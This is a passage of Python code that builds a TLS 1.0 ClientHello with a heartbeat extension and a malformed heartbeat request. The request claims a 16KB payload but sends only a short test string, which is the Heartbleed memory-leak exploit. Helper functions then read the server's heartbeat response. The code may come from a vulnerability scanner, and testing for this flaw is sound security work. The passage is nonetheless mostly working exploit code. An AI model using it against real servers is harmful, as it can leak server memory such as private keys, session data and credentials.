        0x00, 0x02,  # Length
        0x00, 0x2f,  # TLS_RSA_WITH_AES_128_CBC_SHA
    ])
    
    # Client random (32 bytes)
    client_random = bytes(32)
    
    # Session ID (empty)
    session_id = bytes([0x00])
    
    # Compression methods
    compression = bytes([0x01, 0x00])
    
    # Extensions
    extensions = heartbeat_ext
    extensions_len = struct.pack('>H', len(extensions))
    
    # Handshake header
    client_hello_body = (
        bytes([0x03, 0x01]) +  # Version TLS 1.0
        client_random +
        session_id +
        cipher_suites +
        compression +
        extensions_len +
        extensions
    )
    
    handshake = (
        bytes([0x01]) +  # ClientHello
        bytes([0x00]) + struct.pack('>H', len(client_hello_body)) +
        client_hello_body
    )
    
    # TLS record
    record = (
        bytes([0x16]) +  # Content type: Handshake
        bytes([0x03, 0x01]) +  # Version TLS 1.0
        struct.pack('>H', len(handshake)) +
        handshake
    )
    
    return record


def _build_heartbleed_request() -> bytes:
    """Build a malformed heartbeat request (Heartbleed exploit)."""
    # Heartbeat request with mismatched payload length
    # Type: Heartbeat (0x18)
    # Version: TLS 1.0 (0x0301)
    # Payload type: Request (0x01)
    # Payload length: Large value to trigger memory read
    # Actual payload: Small
    
    payload = b'HEARTBLEED_TEST'
    
    # Claim a large payload length but send small payload
    # This is the essence of the Heartbleed vulnerability
    fake_length = 16384  # Request 16KB of data
    
    heartbeat_content = (
        bytes([HEARTBEAT_REQUEST_TYPE]) +
        struct.pack('>H', fake_length) +
        payload
    )
    
    record = (
        bytes([0x18]) +  # Content type: Heartbeat
        bytes([0x03, 0x01]) +  # Version TLS 1.0
        struct.pack('>H', len(heartbeat_content)) +
        heartbeat_content
    )
    
    return record


def _receive_tls_messages(sock: socket.socket) -> Optional[bytes]:
    """Receive TLS handshake messages."""
    try:
        data = b''
        # Read enough for handshake
        while len(data) < 1024:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
            # Check if we got ServerHelloDone or enough messages
            if len(data) >= 256:
                break
        return data if data else None
    except socket.timeout:
        return None


def _receive_heartbeat_response(sock: socket.socket) -> Optional[bytes]:
    """Receive heartbeat response."""
    try:
        sock.settimeout(2)  # Short timeout for heartbeat
        data = sock.recv(65535)
        
        # Check if this is a heartbeat response (content type 0x18)
        if data and len(data) > 5 and data[0] == 0x18:
            return data
        return None
    except socket.timeout:
        return None
    except socket.error:
        return None
